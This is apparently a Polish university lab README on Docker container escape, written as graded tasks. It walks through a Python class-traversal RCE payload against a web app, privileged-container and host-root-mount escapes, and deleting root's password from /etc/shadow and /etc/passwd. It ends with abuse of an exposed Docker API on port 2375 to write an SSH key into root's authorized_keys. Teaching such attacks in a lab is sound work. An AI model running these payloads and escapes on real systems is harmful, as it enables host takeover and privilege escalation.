# Docker Escape
***W tym projekcie prezentujemy przykładową lukę bezpieczeństwa, która umożliwia wydostanie się z kontenera Dockera uruchamiającego aplikację webową.*** <br />
<br />
Poniżej znajdują się instrukcje dotyczące tworzenia i uruchamiania kontenera, a także wskazówki pozwalające na tzw. “ucieczkę” z niego.
<br />
<br />


<br />

*** 
# Tasks
***
<br />

## *Przygotowanie środowiska*
Na początek sklonuj repozytorium poleceniem git clone albo pobierz je w formie paczki ZIP. Do zadań będziemy używać Dockera (kontener w kontenerze, w którym działa serwer ubuntu). Całość została skonfigurowana w pliku Dockerfile.

Jeżeli masz już repozytorium na swoim dysku, przejdź do folderu zawierającego plik konfiguracyjny, a następnie wykonaj poniższe komendy: <br />

1. Build kontenera:
	```bash: 
	docker build -t ubuntu-zetor .
	```
2. Uruchomienie kontenera w tle:
	```bash: 
	docker run -d -p 5000:5000 --privileged --hostname ubuntu-zetor --name ubuntu-zetor ubuntu-zetor
	```
3. Wejście do kontenera:
	```bash: 
	docker exec -itu ursus ubuntu-zetor bash
	```
<br />

## *Zadanie1. - Dostęp do serwera z perspektywy użytkownika aplikacji webowej*
Wewnątrz kontenera jest uruchomiona źle skonfigurowana aplikacja webowa. Za pomocą odpowiednio zmodyfikowanego adresu URL spróbuj wykonać atak typu Remote Code Execution, czyli wywołać kod po stronie serwera np. proste mnożenie 2*2. 
<br />
Jeżeli w wyniku wykonania przykładu zobaczysz rezultat 4, możesz przejść dalej.
 <br />
 
W konsoli możesz skorzystać z programu `hack.py` (znajduje się w repozytorium). Wstaw do niego liczbę, którą znalazłeś zamiast `<Liczba_Którą_Znalazłeś>`.
Jeśli ciekawi Cię, jak to działa, poniższy kod w sprytny sposób przedostaje się z obiektu string przez moduł warnings i klasę WarningMessage do modułu os, który pozwala uruchamiać komendy systemowe.

```
"baiim".__class__.__base__.__subclasses__()[<Liczba_Którą_Znalazłeś>].__init__.__globals__['sys'].modules['os'].popen(<Twoja_Komenda>).read()
```
Spróbuj wyświetlić strukturę plików w katalogu aplikacji na serwerze.

Odpowiedź - wyślij zrzut ekranu z listą plików i folderów w katalogu aplikacji oraz komendą, której użyłeś. 

<br />

## Zadanie2. Docker Escape & Privilege Escalation*


Przed wykonaniem dalszych zadań przejdź do terminala w katalogu projektu.

Niewłaściwa konfiguracja kontenera umożliwia nam ucieczkę do systemu hosta. Wciel się w rolę osoby, która tworzy taki kontener. <br />

1. Spróbuj przełączyć się na użytkownika root (domyślnie nie powinno być to możliwe, ponieważ działasz w ramach konta ursus) {PE}:
	```bash
	su root
	```
2. Wyświetl listę dostępnych obrazów Dockera:
	```
	docker images
	```
3. Pobierz obraz Ubuntu ze zdalnego repozytorium:
	```
	docker pull ubuntu:18.04
	```

4. Po pobraniu sprawdź, czy obraz się poprawnie dodał:
	```
	docker images
	```
5. Poniżej pokazujemy dwa warianty uruchamiania kontenera z potencjalną podatnością: <br />

	1.  
		```
		docker run --rm -it --name kontener-ursus --hostname ubuntu-ursus --privileged ubuntu:18.04 bash
		```
	2. 
		```
		docker run -it -v /:/host/ ubuntu:18.04 chroot /host/ bash
		```
---

> Pierwsza opcja tworzy kontener z flagą --privileged, co pozwala na montowanie partycji hosta bezpośrednio w kontenerze. W zależności od zabezpieczeń serwera możesz mieć możliwość odczytu bądź także edycji plików hosta.

> Druga opcja z reguły daje jeszcze większe możliwości uruchamiającemu kontener (ale też większe ryzyko w razie ataku). Krótko mówiąc, montuje ona wolumen z katalogu / hosta pod /host w kontenerze, co pozwala chociażby wymieniać pliki między hostem a kontenerem.

---

6. Zacznijmy od pierwszego wariantu. 
	Będąc zajogowanym jako **ursus** uruchom kontener {**DE**}. <br />
	Znajdujesz się teraz wewnątrz nowego kontenera. Możesz to potwierdzić poleceniami: ``whoami`` oraz ``hostname``.
	<br />

	***Jak widzisz, w uruchomionym przez Ciebie kontenerze posiadasz uprawnienia roota.. <br />***
	<br />


7. Utwórz w tym kontenerze folder: <br />
	```bash
	mkdir -p /mnt/share
	```
8. Podmontuj dowolną partycję dysku, np. /dev/sdc, do nowo utworzonego katalogu: <br />
	```bash
	mount /dev/sdc /mnt/share
	```
---
Jeśli polecenie mount nie zadziała poprawnie, być może dany dysk nie istnieje lub jest zabezpieczony. Poszukaj innej partycji.

Listę wszystkich partycji sprawdzisz komendą: <br />
```bash
lsblk
```
---
9. Dzięki podmontowaniu partycji jesteśmy w stanie uzyskać dostep do struktury katalogów hosta. Po zamontowaniu sprawdź zawartość zewnętrznego systemu plików:
	```bash
	 ls -l /mnt/share 
	```
	Obejrzyj nieco strukturę systemu — może trafisz na coś interesującego. <br />

10. Opuść kontener komendą ``exit``. <br />


11. Teraz przejdź do drugiego scenariusza. Uruchom kontener za pomocą wspomnianej wyżej komendy. Następnie wylistuj zawartość katalogu, w którym właśnie się znajdujesz.
12. Spróbuj przemieścić się do zewnętrznej struktury plików i odnajdź pliki ``/etc/shadow`` oraz ``/etc/passwd``. Usuń z nich sekcje odpowiedzialne za uwierzytelnienie użytkownika root.
---
  *Jeżeli nie masz zainstalowengo żadnego edytora tekstowego wykonaj poniższe komendy:*
  ```bash
  apt update
  ```
  
  *Instalacja wybranego przez siebie edytora (np. vim, nano):*
  ```bash
  apt install vim
  ```
---
13. Otwórz plik /etc/shadow oraz /etc/passwd w edytorze i usuń fragment dotyczący hasła roota {PE}. Powtórz to samo w obydwu plikach. 

14. Trzeba usunąć część wskazującą na obecność hasła root-a w pliku passwd{**PE**}. Zrób tak samo z plikiem shadow. <br />

15. Wyjdź z kontenera. <br />

16. Zmień użytkownika na root {**PE**}:
	```bash
	su root
	```
Gratulacje, przejąłeś konto roota!! <br />

**Odpowiedź** - prześlij zrzut ekranu potwierdzający, że masz uprawnienia administratora (root).
<br />

## Zadanie3. Capture the flag*
Będąc rootem możesz swobodnie przeglądać i modyfikować system. Odnajdź ukryty katalog, który odróżnia się od pozostałych, a w środku szukaj pliku z flagą. Następnie dodaj do niego swoje imię i nazwisko.

> Flaga to wpis w pliku tekstowym w formacie: ``` CTF{<flaga>} ```

**Odpowiedź** - prześlij zmodyfikowaną flagę (z dopisanym tekstem) oraz ścieżkę do odnalezionego katalogu.  <br />


# Zadanie4.

Poniżej znajduje się przykład konfiguracji środowiska na Windows, zakładając, że korzystasz z Docker Desktop (który działa przez named pipe lub może być skonfigurowany na port TCP). Standardowo na Windows nie ma pliku `/var/run/docker.sock`. Zamiast tego Docker Desktop może wystawić daemon na adresie `tcp://localhost:2375` (należy to włączyć w ustawieniach Docker Desktop: **Expose daemon on tcp://localhost:2375 without TLS**). Dzięki temu można korzystać z `curl` do komunikacji z API Dockera.

![image](https://github.com/user-attachments/assets/4a395865-719a-4a64-a20c-bfafa3d971ab)

## Założenia
- Docker Desktop na Windows jest skonfigurowany tak, aby umożliwić dostęp do Docker Daemon przez `http://localhost:2375`.
- Masz zainstalowany `curl` dla Windows (od Windows 10 w PowerShell `curl` to alias do `Invoke-WebRequest`, możesz także użyć `curl.exe` z paczki binarnej).
- Masz zainstalowany OpenSSH (na Windows 10 i 11 jest to standardowo dostępne lub można doinstalować).

## Kroki

### Krok 1: Wylistowanie obrazów kontenerów dostępnych na hoście Docker
Wykorzystaj następujące polecenie w PowerShell, aby wyświetlić listę obrazów:

```powershell
curl.exe http://localhost:2375/images/json
```

Powinieneś otrzymać JSON z listą obrazów, np.: 

```json
["RepoTags": ["c3:latest"]]
```

### Krok 2: Wygenerowanie pary kluczy SSH
W PowerShell wygeneruj parę kluczy SSH za pomocą poniższego polecenia:

```powershell
ssh-keygen -t rsa
```

Po wygenerowaniu kluczy, skopiuj zawartość klucza publicznego za pomocą:

```powershell
Get-Content .\id_rsa.pub
```

### Krok 3: Utworzenie nowego kontenera
Stwórz nowy kontener z wybranego obrazu (np. `c3:latest`), który zamontuje system plików hosta do `/var/tmp` i doda Twój klucz publiczny do `~root/.ssh/authorized_keys` na hoście. Wykonaj polecenie:

```powershell
curl.exe -X POST -H "Content-Type: application/json" http://localhost:2375/containers/create -d '{
  "Detach": true,
  "AttachStdin": false,
  "AttachStdout": true,
  "AttachStderr": true,
  "Tty": false,
  "Image": "c3:latest",
  "HostConfig": {
    "Binds": ["/:/var/tmp"]
  },
  "Cmd": ["sh", "-c", "echo ssh-rsa AAAA...Twój_klucz_publiczny... >> /var/tmp/root/.ssh/authorized_keys"]
}'
```

Polecenie zwróci Id nowo utworzonego kontenera, np.:

```json
{"Id": "c19a25c6cc72...", "Warnings": []}
```

### Krok 4: Uruchomienie stworzonego kontenera
Uruchom kontener za pomocą poniższego polecenia:

```powershell
curl.exe -X POST -H "Content-Type: application/json" http://localhost:2375/containers/c19a25c6cc72.../start
```

### Krok 5: Logowanie przez SSH
Teraz możesz zalogować się do kontenera przez SSH, używając prywatnego klucza `id_rsa`:

```powershell
ssh -i .\id_rsa root@10.10.x.x
```

W ten sposób wykonujesz podobny atak lub operację, korzystając z dostępu do Docker daemon przez API TCP (`localhost:2375`) zamiast `docker.sock`.



